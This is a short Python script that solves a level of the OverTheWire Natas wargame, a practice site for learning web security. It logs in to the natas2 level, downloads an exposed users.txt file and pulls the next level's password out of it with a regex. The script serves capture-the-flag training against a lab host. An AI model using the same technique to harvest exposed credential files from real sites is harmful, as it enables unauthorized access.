import re
import requests


def get_natas3_password(natas2_password):
    URL = "http://natas2.natas.labs.overthewire.org/files/users.txt"
    s = requests.Session()
    s.auth = ("natas2", natas2_password)
    r = s.get(URL)
    natas3_password = re.findall(r"([a-zA-Z\d]{32})", r.text)[0]
    print("[!] The password for Natas 3 is: " + natas3_password)
    return natas3_password


if __name__ == '__main__':
    natas2_password = "" # Put here the password for natas2 here
    get_natas3_password(natas2_password)
